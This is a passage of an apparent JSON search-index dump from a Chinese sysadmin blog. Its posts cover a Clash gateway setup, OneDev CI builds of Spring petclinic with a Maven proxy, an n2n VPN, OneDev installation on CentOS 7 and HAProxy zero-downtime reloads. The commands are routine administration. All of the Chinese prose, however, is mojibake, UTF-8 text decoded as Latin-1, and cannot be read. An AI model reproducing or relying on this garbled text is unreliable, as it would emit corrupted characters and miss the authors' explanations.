class=\"s\"\u003e[Install]\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003eWantedBy=multi-user.target\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003eEOF\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eç„¶åæœ€é‡è¦çš„ï¼Œå°±æ˜¯é…ç½®æ–‡ä»¶äº†\u003c/p\u003e\n\u003cp\u003eæˆ‘è¿™é‡Œè¿™ä¸ªæ—è·¯ç”±çš„è®¾å¤‡ IP åœ°å€æ˜¯ 192.168.2.2ï¼Œç½‘å¡è®¾å¤‡æ˜¯ enp2s0\u003c/p\u003e","title":"clashçš„æ­å»ºæ•™ç¨‹"},{"content":"ä¸Šç¯‡ç®€å•ä»‹ç»äº† onedev ï¼Œè¿™ç¯‡æˆ‘ä»¬å…·ä½“æ‹¿ä¸ª java spring çš„é¡¹ç›®æ¥å®é™…ç¼–è¯‘ä¸€ä¸‹\né¦–å…ˆå¿…é¡»ç¡®è®¤ç¯å¢ƒï¼š\nonedev å’Œ agent éƒ½æ˜¯ç”¨ root å®‰è£…è¿è¡Œçš„ï¼Œç„¶åå·²ç»å®‰è£…äº† dockerï¼Œä¸” selinux è®¾ç½®ä¸º disabledï¼Œå¦åˆ™ä¼šå‡ºæƒé™éº»çƒ¦ã€‚\næˆ‘ä»¬ç”¨çš„ä¾‹å­æ˜¯ spring çš„ petclinicï¼Œæ­£å¸¸çš„ build çš„æ­¥éª¤å¦‚ä¸‹ï¼š\ngit clone https://github.com/spring-projects/spring-petclinic.git cd spring-petclinic ./mvnw package æˆ‘ä»¬é¦–å…ˆåœ¨ onedev çš„ projects æ–°å»ºä¸€ä¸ªé¡¹ç›® spring-boot\nç„¶ååˆ° clone ä¸‹æ¥çš„æºä»£ç ç›®å½•ä¸‹\ncd spring-petclinic git init git add . git commit -m \u0026#34;Spring boot demo project\u0026#34; git remote add origin http://192.168.86.101:6610/spring-boot git push --set-upstream origin master è¿™æ ·å°±å¯ä»¥åœ¨ spring-boot é‡Œçœ‹åˆ°ä»£ç äº†\nç„¶åçœ‹ä¸Šå›¾ï¼Œæœ‰ä¸ªç´«è‰²ç¯æ³¡ï¼ŒEnable build support by adding.onedev-buildspec.ymlï¼Œç‚¹é‚£ä¸ªé“¾æ¥\næˆ‘ä»¬å¢åŠ ä¸€ä¸ª build çš„æ­¥éª¤ï¼Œé‡Œé¢å†å¢åŠ ä¸¤ä¸ª jobï¼Œä¸€ä¸ªæ˜¯ Get code ï¼Œä¸€ä¸ªæ˜¯ build\nç¬¬ä¸€æ­¥è‚¯å®šæ˜¯æŠŠä»£ç æ‹¿ä¸‹æ¥ï¼Œé€‰æ‹© Checkout Code ï¼Œå‘½åä¸º Get code ï¼Œç„¶åå…¶ä»–ä¿æŒç¼ºçœé…ç½®ï¼Œä¿å­˜\nç¬¬äºŒæ­¥å°±æ˜¯ build ä»£ç ï¼Œé€‰æ‹© Execute Shell/Batch Commandsï¼Œç„¶åå®é™…æ˜¯å¯åŠ¨äº†ä¸€ä¸ª docker é•œåƒæ¥æ‰§è¡Œ build çš„è¿‡ç¨‹\nImage å¡«å…¥ï¼šmaven:3.5-jdk-8-alphine\nCommands å¡«å…¥ï¼š\nunset MAVEN_CONFIG cat \u0026lt;\u0026lt; EOF \u0026gt;\u0026gt; /root/.m2/settings.xml \u0026lt;settings\u0026gt; \u0026lt;proxies\u0026gt; \u0026lt;proxy\u0026gt; \u0026lt;id\u0026gt;default\u0026lt;/id\u0026gt; \u0026lt;active\u0026gt;true\u0026lt;/active\u0026gt; \u0026lt;protocol\u0026gt;http\u0026lt;/protocol\u0026gt; \u0026lt;host\u0026gt;192.168.1.10\u0026lt;/host\u0026gt; \u0026lt;port\u0026gt;3128\u0026lt;/port\u0026gt; \u0026lt;/proxy\u0026gt; \u0026lt;/proxies\u0026gt; \u0026lt;/settings\u0026gt; EOF ./mvnw package è§£é‡Šä¸€ä¸‹ï¼Œmaven:3.5-jdk-8-alphine è¿™ä¸ªé•œåƒï¼Œå¦‚æœåœ¨é‡Œé¢æ‰§è¡Œ mvnw package ï¼Œä¼šæŠ¥é”™ repository çš„é”™ï¼Œæ‰€ä»¥å¿…é¡»æŠŠ MAVEN_CONFIG çš„ç¯å¢ƒå˜é‡ç»™åˆ é™¤ï¼Œå¦å¤–æ•´ä¸ª build è¿‡ç¨‹ä¼šå»æ‹‰ N å¤šåŒ…å’Œé…ç½®ï¼Œå¤§æ¦‚200å¤šå…†ï¼Œå¦‚æœä¸ç¿»å¢™ï¼ŒåŸºæœ¬æ˜¯å¤±è´¥ã€‚æ‰€ä»¥è¿™é‡Œå¼ºåˆ¶ mvn ä½¿ç”¨äº†ä»£ç†ï¼ï¼ï¼å¦åˆ™ build ä¸€å¤©éƒ½ä¸ä¼šæˆåŠŸã€‚\nç¬¬ä¸‰æ­¥æ˜¯é…ç½® mvn repositoryçš„ç¼“å­˜ï¼Œå¤§å®¶ä¸æƒ³æ¯æ¬¡buildéƒ½å»ä¸‹ä¸€éä¾èµ–åŒ…å§ï¼Œåœ¨ More Settings è®¾ç½®\nåœ¨Cachesé‡Œå¡«å…¥ï¼š\nkey: maven-cache\npath: /root/.m2/repository\nç„¶åæ‰§è¡Œ Build , ç„¶åç­‰å¾…ï¼Œç¬¬ä¸€æ¬¡æ—¶é—´ä¼šå¾ˆé•¿ï¼Œç»ˆäº Successful äº†\næ¥ä¸‹æ¥çš„æ­¥éª¤å°±å¯ä»¥ç”¨ Dockerfile ç”Ÿæˆé•œåƒï¼Œç„¶åæ¨åˆ° Harborï¼Œå†ä¸‹è½½æˆ–è€… gitopsä¸‹è½½æ¥å„ç§ yaml æ–‡ä»¶ï¼Œæ‹‰ kubectl å’Œé…ç½®æ–‡ä»¶ï¼Œå°±å¯ä»¥æ¨é€åˆ° kubernetes äº†ã€‚\nè¡¥å……ä¸€ä¸‹ï¼Œåœ¨åˆ«çš„åœ°æ–¹çªç„¶çœ‹åˆ°æœ‰ maven çš„é˜¿é‡Œé•œåƒåœ°å€ï¼Œè®°å½•ä¸€ä¸‹ï¼š\n\u0026lt;mirror\u0026gt; \u0026lt;id\u0026gt;alimaven\u0026lt;/id\u0026gt; \u0026lt;name\u0026gt;aliyun maven\u0026lt;/name\u0026gt; \u0026lt;url\u0026gt;http://maven.aliyun.com/nexus/content/groups/public/\u0026lt;/url\u0026gt; \u0026lt;mirrorOf\u0026gt;*\u0026lt;/mirrorOf\u0026gt; \u0026lt;/mirror\u0026gt; ","permalink":"https://rendoumi.com/posts/20211108-onedev_maven/","summary":"\u003cp\u003eä¸Šç¯‡ç®€å•ä»‹ç»äº† onedev ï¼Œè¿™ç¯‡æˆ‘ä»¬å…·ä½“æ‹¿ä¸ª java spring çš„é¡¹ç›®æ¥å®é™…ç¼–è¯‘ä¸€ä¸‹\u003c/p\u003e\n\u003cp\u003eé¦–å…ˆå¿…é¡»ç¡®è®¤ç¯å¢ƒï¼š\u003c/p\u003e\n\u003cp\u003eonedev å’Œ agent éƒ½æ˜¯ç”¨ root å®‰è£…è¿è¡Œçš„ï¼Œç„¶åå·²ç»å®‰è£…äº† dockerï¼Œä¸” selinux è®¾ç½®ä¸º disabledï¼Œå¦åˆ™ä¼šå‡ºæƒé™éº»çƒ¦ã€‚\u003c/p\u003e\n\u003cp\u003eæˆ‘ä»¬ç”¨çš„ä¾‹å­æ˜¯ spring çš„ petclinicï¼Œæ­£å¸¸çš„ build çš„æ­¥éª¤å¦‚ä¸‹ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egit clone https://github.com/spring-projects/spring-petclinic.git\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003ecd\u003c/span\u003e spring-petclinic\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e./mvnw package\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eæˆ‘ä»¬é¦–å…ˆåœ¨ onedev çš„ projects æ–°å»ºä¸€ä¸ªé¡¹ç›® spring-boot\u003c/p\u003e\n\u003cp\u003eç„¶ååˆ° clone ä¸‹æ¥çš„æºä»£ç ç›®å½•ä¸‹\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003ecd\u003c/span\u003e spring-petclinic\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egit init\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egit add .\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egit commit -m \u003cspan class=\"s2\"\u003e\u0026#34;Spring boot demo project\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egit remote add origin http://192.168.86.101:6610/spring-boot\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egit push --set-upstream origin master\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eè¿™æ ·å°±å¯ä»¥åœ¨ spring-boot é‡Œçœ‹åˆ°ä»£ç äº†\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20211105113350311\" loading=\"lazy\" src=\"/posts/20211108-onedev_maven/image-20211105113350311.png\"\u003e\u003c/p\u003e\n\u003cp\u003eç„¶åçœ‹ä¸Šå›¾ï¼Œæœ‰ä¸ªç´«è‰²ç¯æ³¡ï¼Œ\u003ccode\u003eEnable build support by adding.onedev-buildspec.yml\u003c/code\u003eï¼Œç‚¹é‚£ä¸ªé“¾æ¥\u003c/p\u003e","title":"onedevæ„å»ºä¸€ä¸ªå®é™…java springåº”ç”¨"},{"content":"vpnçš„æ­å»ºä¸€ç›´æ˜¯ä¸€ä¸ªéš¾è§£çš„é¢˜ç›®ï¼Œopenvpnã€ipsecã€tinc éƒ½åœ¨ç”¨ï¼Œéƒ½ä¸å¤Ÿç®€æ´ã€‚\nn2n æ˜¯ä¸€ç§ peer to peer ç«¯åˆ°ç«¯çš„ vpnï¼Œæ­å»ºèµ·æ¥éå¸¸ç®€å•æ–¹ä¾¿ã€‚å¿…å¤‡åˆ©å™¨\né¦–å…ˆäº†è§£ä¸€ä¸‹æ¦‚å¿µ\nn2n çš„ vpn åˆ†ä¸ºä¸¤ç§è§’è‰²ï¼ŒSupernode è¶…çº§èŠ‚ç‚¹å’Œ Edgenode è¾¹ç¼˜èŠ‚ç‚¹ã€‚\nå¾ˆç®€å•ï¼ŒSupernode æœ€å¥½æ˜¯å…¬ç½‘åœ°å€ï¼Œéœ€è¦å¼€æ”¾ç«¯å£ä¾›å…¶å®ƒèŠ‚ç‚¹è¿æ¥ä¸Šæ¥ï¼›å‰©ä½™çš„ Edgenode å¯ä»¥æ²¡æœ‰å…¬ç½‘åœ°å€ï¼Œå„ä¸ª Edgenode è¾¹ç¼˜èŠ‚ç‚¹ä¹‹é—´ä¼šå°è¯•ç»•è¿‡ Supernode ç›´æ¥è¿æ¥ã€‚è¿™å¤§å¤§æé«˜äº†èŠ‚ç‚¹ä¹‹é—´é€šè®¯çš„æ•ˆç‡ã€‚é€šè®¯æ˜¯åŠ å¯†çš„ï¼Œéå¸¸å®‰å…¨ã€‚\nå®‰è£…çš„è¯å®Œå…¨ä¸ç”¨å®‰è£…ï¼Œç›´æ¥ä¸€ä¸ªå‘½ä»¤å°±æå®šäº†ã€‚\nhttps://github.com/ntop/n2n\nå¼„å‡ºä¸¤ä¸ªå¯æ‰§è¡Œæ–‡ä»¶ supernode å’Œ edge å°±å¥½äº†\nè¶…çº§èŠ‚ç‚¹ï¼š\n/usr/local/bin/supernode -p 11111 -v è¾¹ç¼˜èŠ‚ç‚¹ï¼š\n/usr/local/bin/edge -d n2n0 -c ThisisaSecret2012 -k Fuck2020 -a 192.168.0.2 -l 41.22.59.112:11111 -f å‚æ•°è§£é‡Šï¼š\n-d ç”Ÿæˆçš„è™šæ‹Ÿç½‘å¡çš„å‘½å -c æŸç»„vpnèŠ‚ç‚¹çš„å£ä»¤ã€‚å¤§å®¶çœ‹åˆ°å¯åŠ¨ supernode çš„æ—¶å€™æ²¡æœ‰ä»»ä½•å‚æ•°ï¼Œsupdernode åªè´Ÿè´£è½¬å‘ã€‚supernode æ”¯æŒå¤šç»„ä¸åŒçš„ vpnã€‚è¿™é‡Œå°±æ˜¯ç”¨æ¥åŒºåˆ†ä¸åŒçš„ vpn ç»„çš„ã€‚ -k èŠ‚ç‚¹ä¹‹é—´é€šè®¯æ˜¯ç”¨çš„ twofish åŠ å¯†ç®—æ³•ï¼Œè¿™é‡ŒæŒ‡å®šçš„æ˜¯å¯†é’¥ -a èŠ‚ç‚¹çš„ip -l supernodeçš„ipå’Œç«¯å£ -f æ”¾åˆ°åå° daemon æ‰§è¡Œ è¿™æ ·å°±å»ºç«‹å¥½äº†ï¼Œç³»ç»Ÿä¸­ä¼šå¤šå‡ºä¸€å¼  n2n0 çš„ç½‘å¡ã€‚\n","permalink":"https://rendoumi.com/posts/20211105-n2n_vpn/","summary":"\u003cp\u003evpnçš„æ­å»ºä¸€ç›´æ˜¯ä¸€ä¸ªéš¾è§£çš„é¢˜ç›®ï¼Œopenvpnã€ipsecã€tinc éƒ½åœ¨ç”¨ï¼Œéƒ½ä¸å¤Ÿç®€æ´ã€‚\u003c/p\u003e\n\u003cp\u003en2n æ˜¯ä¸€ç§ peer to peer ç«¯åˆ°ç«¯çš„ vpnï¼Œæ­å»ºèµ·æ¥éå¸¸ç®€å•æ–¹ä¾¿ã€‚å¿…å¤‡åˆ©å™¨\u003c/p\u003e\n\u003cp\u003eé¦–å…ˆäº†è§£ä¸€ä¸‹æ¦‚å¿µ\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20211105135642166\" loading=\"lazy\" src=\"/posts/20211105-n2n_vpn/image-20211105135642166.png\"\u003e\u003c/p\u003e\n\u003cp\u003en2n çš„ vpn åˆ†ä¸ºä¸¤ç§è§’è‰²ï¼ŒSupernode è¶…çº§èŠ‚ç‚¹å’Œ Edgenode è¾¹ç¼˜èŠ‚ç‚¹ã€‚\u003c/p\u003e\n\u003cp\u003eå¾ˆç®€å•ï¼ŒSupernode æœ€å¥½æ˜¯å…¬ç½‘åœ°å€ï¼Œéœ€è¦å¼€æ”¾ç«¯å£ä¾›å…¶å®ƒèŠ‚ç‚¹è¿æ¥ä¸Šæ¥ï¼›å‰©ä½™çš„ Edgenode å¯ä»¥æ²¡æœ‰å…¬ç½‘åœ°å€ï¼Œå„ä¸ª Edgenode è¾¹ç¼˜èŠ‚ç‚¹ä¹‹é—´ä¼šå°è¯•ç»•è¿‡ Supernode ç›´æ¥è¿æ¥ã€‚è¿™å¤§å¤§æé«˜äº†èŠ‚ç‚¹ä¹‹é—´é€šè®¯çš„æ•ˆç‡ã€‚é€šè®¯æ˜¯åŠ å¯†çš„ï¼Œéå¸¸å®‰å…¨ã€‚\u003c/p\u003e\n\u003cp\u003eå®‰è£…çš„è¯å®Œå…¨ä¸ç”¨å®‰è£…ï¼Œç›´æ¥ä¸€ä¸ªå‘½ä»¤å°±æå®šäº†ã€‚\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/ntop/n2n\"\u003ehttps://github.com/ntop/n2n\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003eå¼„å‡ºä¸¤ä¸ªå¯æ‰§è¡Œæ–‡ä»¶ supernode å’Œ edge å°±å¥½äº†\u003c/p\u003e\n\u003cp\u003eè¶…çº§èŠ‚ç‚¹ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e/usr/local/bin/supernode -p \u003cspan class=\"m\"\u003e11111\u003c/span\u003e -v\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eè¾¹ç¼˜èŠ‚ç‚¹ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e/usr/local/bin/edge -d n2n0 -c ThisisaSecret2012 -k Fuck2020 -a 192.168.0.2 -l 41.22.59.112:11111 -f\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eå‚æ•°è§£é‡Šï¼š\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e-d ç”Ÿæˆçš„è™šæ‹Ÿç½‘å¡çš„å‘½å\u003c/li\u003e\n\u003cli\u003e-c \u003c!-- raw HTML omitted --\u003e æŸç»„vpnèŠ‚ç‚¹çš„å£ä»¤ã€‚å¤§å®¶çœ‹åˆ°å¯åŠ¨ supernode çš„æ—¶å€™æ²¡æœ‰ä»»ä½•å‚æ•°ï¼Œsupdernode åªè´Ÿè´£è½¬å‘ã€‚supernode æ”¯æŒå¤šç»„ä¸åŒçš„ vpnã€‚è¿™é‡Œå°±æ˜¯ç”¨æ¥åŒºåˆ†ä¸åŒçš„ vpn ç»„çš„ã€‚\u003c/li\u003e\n\u003cli\u003e-k \u003c!-- raw HTML omitted --\u003e èŠ‚ç‚¹ä¹‹é—´é€šè®¯æ˜¯ç”¨çš„ twofish åŠ å¯†ç®—æ³•ï¼Œè¿™é‡ŒæŒ‡å®šçš„æ˜¯å¯†é’¥\u003c/li\u003e\n\u003cli\u003e-a èŠ‚ç‚¹çš„ip\u003c/li\u003e\n\u003cli\u003e-l supernodeçš„ipå’Œç«¯å£\u003c/li\u003e\n\u003cli\u003e-f æ”¾åˆ°åå° daemon æ‰§è¡Œ\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eè¿™æ ·å°±å»ºç«‹å¥½äº†ï¼Œç³»ç»Ÿä¸­ä¼šå¤šå‡ºä¸€å¼  n2n0 çš„ç½‘å¡ã€‚\u003c/p\u003e","title":"n2nä¸€ç§peer to peerçš„VPNçš„ä½¿ç”¨"},{"content":"å…¶å®ä¸€ç›´åœ¨ç”¨ githubã€gitlabã€jenkinsï¼Œä½†æ˜¯ github æ—¶ä¸æ—¶çš„æŠ½é£ï¼Œ gitlab çš„ runner å¥— Docker in docker çš„æ–¹æ³•å§”å®å¾ˆéš¾ç”¨ã€‚\næ‰€ä»¥ CI/CD è¿™ä¸€å—åå€’æŒºå–œæ¬¢é˜¿é‡Œäº‘æ•ˆè¿™ç§ç®€ä¾¿æ˜“è¡Œçš„ã€‚ä½†ç¡®å®æ‰¾ä¸åˆ°å…¶ä»–åˆé€‚ä¸”ç±»ä¼¼çš„è½¯ä»¶ã€‚\nä» V2EX ä¸Šçœ‹åˆ°ä¸€ä¸ªè€å“¥å‘çš„ onedevï¼Œæ˜¯ä¸€ä¸ªä¸€ç«™å¼çš„å¼€æºè½¯ä»¶ï¼Œè¿™ä¸å°±è¯•è¯•å…ˆ\nä»¥ centos7 ä¸ºä¾‹ï¼Œå®‰è£…è¿‡ç¨‹å¦‚ä¸‹ï¼š\nä¸€ã€å®‰è£… java 1.8 ç‰ˆæœ¬ rpm -ivh jdk-8u201-linux-x64.rpm äºŒã€å®‰è£… git é«˜ç‰ˆæœ¬ ç¼ºçœ centos7 å’Œ epel å¸¦çš„ git ç‰ˆæœ¬å¤ªä½ï¼Œä¸ç¬¦åˆè¦æ±‚ï¼Œå¾—åŠ ä¸ªæ–°çš„æºè£…æ–°ç‰ˆæœ¬\nyum -y install https://packages.endpoint.com/rhel/7/os/x86_64/endpoint-repo-1.7-1.x86_64.rpm yum -y install git curl ä¸‰ã€å®‰è£…é…ç½® onedev https://github.com/theonedev/onedev\nä¸‹è½½å‹ç¼©åŒ…ï¼Œç„¶åè§£å‹è¿è¡Œ bin/server.sh start ï¼Œå¾ˆç®€æ´ï¼Œä¸é”™ï¼\nè¿è¡Œå®Œæ‰“å¼€ http://192.168.86.101:6610 è¿›è¡Œåˆå§‹é…ç½®ï¼Œå°±ä¸¤æ­¥å°± ok äº†ã€‚\nä¸‰ã€ä¾‹å­ æˆ‘ä»¬æ˜¯è¦åœ¨æ­£å¼ç”Ÿäº§ç¯å¢ƒç”¨çš„ï¼Œæ‰€ä»¥åœ¨ projects æ–°å»ºä¸€ä¸ªé¡¹ç›® spring-bootï¼Œä»¥ spring-petclinic ä¸ºä¾‹ï¼š\nç„¶ååˆ°æºä»£ç ç›®å½•ä¸‹\ngit clone https://github.com/spring-projects/spring-petclinic.git cd spring-petclinic ./mvnw package cd spring-petclinic git init git add . git commit -m \u0026#34;Spring boot demo project\u0026#34; git remote add origin http://192.168.86.101:6610/spring-boot git push --set-upstream origin master è¿™æ ·å°±å¯ä»¥åœ¨ spring-boot é‡Œçœ‹åˆ°ä»£ç äº†\nç„¶åçœ‹ä¸Šå›¾ï¼Œæœ‰ä¸ªç´«è‰²ç¯æ³¡ï¼ŒEnable build support by adding.onedev-buildspec.ymlï¼Œç‚¹é‚£ä¸ªé“¾æ¥å°±å¯ä»¥è¿›å…¥ä¸€ç³»åˆ— build ã€pushã€deploy çš„ pipeline äº†ã€‚\nå‹æƒ…æç¤ºï¼Œå•æœºçš„è¯ï¼Œæœºå™¨éœ€è¦è£… onedev çš„ agentï¼Œç„¶åè¿˜æœ‰ dockerï¼Œå°±å¯ä»¥buildäº†ã€‚ç”¨èµ·æ¥æ„Ÿè§‰è·Ÿäº‘æ•ˆå·®ä¸å¤šï¼Œå¾ˆä¸é”™ã€‚\n","permalink":"https://rendoumi.com/posts/20211105-onedev/","summary":"\u003cp\u003eå…¶å®ä¸€ç›´åœ¨ç”¨ githubã€gitlabã€jenkinsï¼Œä½†æ˜¯ github æ—¶ä¸æ—¶çš„æŠ½é£ï¼Œ gitlab çš„ runner å¥— Docker in docker çš„æ–¹æ³•å§”å®å¾ˆéš¾ç”¨ã€‚\u003c/p\u003e\n\u003cp\u003eæ‰€ä»¥ CI/CD è¿™ä¸€å—åå€’æŒºå–œæ¬¢é˜¿é‡Œäº‘æ•ˆè¿™ç§ç®€ä¾¿æ˜“è¡Œçš„ã€‚ä½†ç¡®å®æ‰¾ä¸åˆ°å…¶ä»–åˆé€‚ä¸”ç±»ä¼¼çš„è½¯ä»¶ã€‚\u003c/p\u003e\n\u003cp\u003eä» V2EX ä¸Šçœ‹åˆ°ä¸€ä¸ªè€å“¥å‘çš„ onedevï¼Œæ˜¯ä¸€ä¸ªä¸€ç«™å¼çš„å¼€æºè½¯ä»¶ï¼Œè¿™ä¸å°±è¯•è¯•å…ˆ\u003c/p\u003e\n\u003cp\u003eä»¥ centos7 ä¸ºä¾‹ï¼Œå®‰è£…è¿‡ç¨‹å¦‚ä¸‹ï¼š\u003c/p\u003e\n\u003ch2 id=\"ä¸€å®‰è£…--java-18-ç‰ˆæœ¬\"\u003eä¸€ã€å®‰è£…  java 1.8 ç‰ˆæœ¬\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003erpm -ivh jdk-8u201-linux-x64.rpm\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"äºŒå®‰è£…-git-é«˜ç‰ˆæœ¬\"\u003eäºŒã€å®‰è£… git é«˜ç‰ˆæœ¬\u003c/h2\u003e\n\u003cp\u003eç¼ºçœ centos7 å’Œ epel å¸¦çš„ git ç‰ˆæœ¬å¤ªä½ï¼Œä¸ç¬¦åˆè¦æ±‚ï¼Œå¾—åŠ ä¸ªæ–°çš„æºè£…æ–°ç‰ˆæœ¬\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eyum -y install https://packages.endpoint.com/rhel/7/os/x86_64/endpoint-repo-1.7-1.x86_64.rpm\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eyum -y install git curl\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"ä¸‰å®‰è£…é…ç½®-onedev\"\u003eä¸‰ã€å®‰è£…é…ç½® onedev\u003c/h2\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/theonedev/onedev\"\u003ehttps://github.com/theonedev/onedev\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003eä¸‹è½½å‹ç¼©åŒ…ï¼Œç„¶åè§£å‹è¿è¡Œ bin/server.sh start ï¼Œå¾ˆç®€æ´ï¼Œä¸é”™ï¼\u003c/p\u003e\n\u003cp\u003eè¿è¡Œå®Œæ‰“å¼€ http://192.168.86.101:6610 è¿›è¡Œåˆå§‹é…ç½®ï¼Œå°±ä¸¤æ­¥å°± ok äº†ã€‚\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20211105110253646\" loading=\"lazy\" src=\"/posts/20211105-onedev/image-20211105110253646.png\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20211105110326330\" loading=\"lazy\" src=\"/posts/20211105-onedev/image-20211105110326330.png\"\u003e\u003c/p\u003e\n\u003ch2 id=\"ä¸‰ä¾‹å­\"\u003eä¸‰ã€ä¾‹å­\u003c/h2\u003e\n\u003cp\u003eæˆ‘ä»¬æ˜¯è¦åœ¨æ­£å¼ç”Ÿäº§ç¯å¢ƒç”¨çš„ï¼Œæ‰€ä»¥åœ¨ projects æ–°å»ºä¸€ä¸ªé¡¹ç›® spring-bootï¼Œä»¥ spring-petclinic ä¸ºä¾‹ï¼š\u003c/p\u003e\n\u003cp\u003eç„¶ååˆ°æºä»£ç ç›®å½•ä¸‹\u003c/p\u003e","title":"ä¸€ç«™å¼Gitè½¯ä»¶onedevçš„å®‰è£…ä½¿ç”¨"},{"content":"Nginx å¯ä»¥ç”¨ kill -HUP æ¥é‡å¯ï¼Œä¸ä¼šä¸¢å¤±å·²å»ºè¿æ¥ã€‚Haproxy å¦‚ä½•åšæ‰èƒ½åšåˆ° zero downtime æ— ç¼é‡è½½å‘¢ï¼Ÿ\nåšæ³•å¦‚ä¸‹ï¼š\nä¸€ã€é…ç½® ç¼–è¯‘harpoxyçš„æ—¶å€™å¸¦ä¸Šå‚æ•° USE_SYSTEMDï¼Œé€‰æ‹© Haproxy 1.8 ä»¥ä¸Šç‰ˆæœ¬\nmake TARGET=linux2628 USE_GETADDRINFO=1 USE_ZLIB=1 USE_REGPARM=1 USE_OPENSSL=1 \\ USE_SYSTEMD=1 USE_PCRE=1 USE_PCRE_JIT=1 USE_NS=1 make install Haproxyæ— ç¼é‡è½½æŠ€æœ¯ï¼š\næ—§è¿›ç¨‹å½“å‰ç®¡ç†çš„è¿æ¥æ ¹æ® file descriptor æ–‡ä»¶æè¿°ç¬¦é€šè¿‡ socket å¥—æ¥å­—ä¼ è¾“åˆ°æ–°è¿›ç¨‹ã€‚\nåœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­ï¼Œæ–‡ä»¶socketï¼ˆunix socketï¼‰çš„è¿æ¥æ²¡æœ‰æ–­å¼€ã€‚\næ–°è¿›ç¨‹åœ¨å……å½“ master-worker ä¸»å·¥ä½œè€…çš„åŒæ—¶æ‰§è¡Œæ­¤ä»»åŠ¡ã€‚\nç»¼ä¸Šæ‰€è¿°ï¼Œé€šè¿‡ä½¿ç”¨unix socketæ¥ç»´æŠ¤è¿æ¥çŠ¶æ€å¹¶åœ¨æ—§è¿›ç¨‹å’Œæ–°è¿›ç¨‹ä¹‹é—´ä¼ é€’ï¼Œé˜²æ­¢äº†è¿æ¥ä¸¢å¤±ã€‚\nhaproxy çš„è¿è¡Œä½¿ç”¨ Systemd é‡è½½ï¼Œä½¿ç”¨ -Ws æ–¹å¼ã€‚ ï¼ˆæ­¤å¤–ï¼Œåœ¨æ„å»ºæ—¶å¿…é¡»å¯ç”¨ USE_SYSTEMDï¼‰\n-D : start as a daemon. The process detaches from the current terminal after forking, and errors are not reported anymore in the terminal. It is equivalent to the \u0026#34;daemon\u0026#34; keyword in the \u0026#34;global\u0026#34; section of the configuration. It is recommended to always force it in any 